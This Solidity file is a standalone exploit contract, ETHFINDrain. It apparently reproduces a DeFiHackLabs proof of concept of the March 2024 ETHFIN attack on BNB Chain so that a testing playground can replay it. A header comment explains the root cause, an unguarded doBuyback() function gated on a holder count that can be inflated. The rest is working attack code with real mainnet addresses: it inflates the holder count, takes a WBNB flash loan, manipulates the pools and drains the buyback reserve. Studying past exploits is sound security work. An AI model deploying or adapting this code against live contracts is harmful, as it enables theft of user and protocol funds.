// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-03-ETHFIN).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ETHFIN extends BaseTestWithBalanceLog and IS the attacker: attacker =
// address(this); the PancakeV3 flash callback `pancakeV3FlashCallback` lives
// on the test itself). There is no standalone exploit contract to deploy, so
// this contract is a faithful, self-contained copy of that inline attack
// (the holder-count-inflation loop + the flash-loan callback), compiled
// inside the registry forge project so the playground can deploy and record
// it via run(). Logic and constants are copied verbatim from
// test/ETHFIN_exp.sol.
//
// Root cause: EthernalFinanceII.doBuyback() is public with no access control,
// gated only on a sybil-able N_holders counter (any 1-wei transfer to a new
// address increments it). The attacker inflates the holder count, pre-buys
// ETHFIN cheaply with flash-loaned WBNB, triggers doBuyback() (which spends
// the contract's OWN BuybackPotBNB reserve on a slippage-free market buy +
// burn, pumping the price), then sells the pre-bought ETHFIN into the pump.

interface IETHFIN {
    function N_holders() external view returns (uint256);
    function NextBuybackMemberCount() external view returns (uint256);
    function transfer(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
}

interface IPancakePool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPancakePair {
    function skim(address to) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IETHFINToken {
    function doBuyback() external returns (bool);
}

interface IWBNB {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address dst, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
}

interface IUniRouterV2 {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

contract ETHFINDrain {
    address constant WBNB_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IWBNB constant wbnb = IWBNB(payable(WBNB_ADDRESS));

    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniRouterV2 constant router = IUniRouterV2(payable(ROUTER_ADDRESS));

    address constant ETHFIN = 0x17Bd2E09fA4585c15749F40bb32a6e3dB58522bA;
    IETHFIN constant ethfinToken = IETHFIN(ETHFIN);

    address constant PANCAKE_V3_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;

    address constant EFTOKEN = 0xA964a6dab034A4b5985603f7e86a596c7e0eA96e;

    address constant PANCAKE_SWAP = 0x2b73Ee230dB9d7ddB51B859a3B59Ce48eB5aB4D9; // ethfin-finsimp
    address constant PANCAKE_SWAP2 = 0x168FDb7C2d4249485836595c8576D8f2D7c53a46; // ethfin-ethfin
    address constant PANCAKE_SWAP3 = 0x3544DA62afB297b5cE9DA14845C89b96D376D98C; // ethfin-wbnb

    // step 0: inflate the holder count, then flash-loan 12 WBNB to fund the attack.
    function run() external {
        uint256 holders = ethfinToken.N_holders();
        uint256 nextBuybackMemberCount = ethfinToken.NextBuybackMemberCount();
        uint160 base = 501;
        // weird loop — arm the doBuyback() trigger for the gas cost of N transfers
        while (holders <= nextBuybackMemberCount) {
            ethfinToken.transfer(address(base), 1);
            holders = ethfinToken.N_holders();
            base++;
        }

        IPancakePool(PANCAKE_V3_POOL).flash(
            address(this),
            0,
            12_000_000_000_000_000_000,
            abi.encode(0x000000000000000000000000172fcd41e0913e95784454622d1c3724f546f849)
        );

        // sweep the resulting BNB to the caller (deployer) — no additional accounting,
        // the recorder measures the attacker's native balance delta directly.
    }

    function pancakeV3FlashCallback(uint256, uint256, bytes calldata) external {
        wbnb.approve(ROUTER_ADDRESS, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = WBNB_ADDRESS;
        path[1] = EFTOKEN;
        router.swapTokensForExactTokens(
            543_357_312_592_081_354_942_659_827, 12_000_000_000_000_000_000, path, PANCAKE_SWAP, block.timestamp + 120
        );
        IPancakePair(PANCAKE_SWAP).skim(EFTOKEN);

        router.swapTokensForExactTokens(
            10, wbnb.balanceOf(address(this)), path, PANCAKE_SWAP2, block.timestamp + 120
        );
        path[1] = ETHFIN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)) - 1000, 0, path, PANCAKE_SWAP2, block.timestamp + 120
        );
        IPancakePair(PANCAKE_SWAP2).skim(address(this));

        bool status = IETHFINToken(ETHFIN).doBuyback();
        require(status, "Buyback failed");

        path[1] = EFTOKEN;
        router.swapTokensForExactTokens(
            10, wbnb.balanceOf(address(this)), path, PANCAKE_SWAP2, block.timestamp + 120
        );
        uint256 ethfinBalance = ethfinToken.balanceOf(address(this));
        ethfinToken.transfer(PANCAKE_SWAP2, ethfinBalance);
        IPancakePair(PANCAKE_SWAP2).skim(PANCAKE_SWAP3);

        address[] memory path2 = new address[](2);
        path2[0] = ETHFIN;
        path2[1] = WBNB_ADDRESS;
        uint256[] memory amountsOut = router.getAmountsOut(ethfinBalance, path2);
        IPancakePair(PANCAKE_SWAP3).swap(0, amountsOut[1], address(this), "");

        wbnb.transfer(PANCAKE_V3_POOL, 12_001_200_000_000_000_000);
        wbnb.withdraw(wbnb.balanceOf(address(this)));
    }

    fallback() external payable {}
    receive() external payable {}
}
